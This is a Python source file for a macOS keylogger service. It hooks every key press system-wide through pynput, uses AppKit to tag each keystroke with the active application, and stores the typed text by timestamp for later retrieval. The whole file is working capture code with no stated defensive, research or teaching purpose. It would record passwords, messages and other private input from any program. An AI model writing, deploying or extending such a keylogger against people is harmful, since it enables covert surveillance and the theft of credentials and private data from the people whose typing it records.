from typing import Dict
from datetime import datetime
from pynput.keyboard import Listener, Key
import AppKit
from key_logger_interface import KeyLoggerInterface


def format_key(key: Key | None) -> str:
    if key == Key.space:
        return " "  # כאשר לוחצים על רווח, מחזירים רווח רגיל
    if isinstance(key, Key):
        return f"[{key.name}]"
    elif hasattr(key, 'char') and key.char:
        return key.char
    return "[UNKNOWN]"



def get_active_application() -> str:
    app = AppKit.NSWorkspace.sharedWorkspace().activeApplication()
    return app.get('NSApplicationName', 'Unknown Application')


class KeyLoggerService(KeyLoggerInterface):
    def __init__(self):
        self.key_logs: Dict[str, Dict[str, str]] = {}  # {timestamp: {app_name: keys}}
        self.listener: Listener | None = None

    def start_logging(self) -> None:
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self) -> None:
        if self.listener:
            self.listener.stop()
        print("\nLogging stopped.")

    def get_logged_keys(self) -> Dict[str, Dict[str, str]]:
        logged_keys = self.key_logs.copy()
        self.key_logs.clear()
        return logged_keys

    def log_key_press(self, key_name: str, active_app: str) -> None:
        timestamp = datetime.now().strftime("%Y-%m-%d %H_%M")
        if timestamp not in self.key_logs:
            self.key_logs[timestamp] = {}

        if active_app not in self.key_logs[timestamp]:
            self.key_logs[timestamp][active_app] = ""

        self.key_logs[timestamp][active_app] += key_name

    def on_press(self, key: Key | None) -> None:
        key_name = format_key(key)
        active_app = get_active_application()

        self.log_key_press(key_name, active_app)

        if key == Key.esc:
            self.stop_logging()




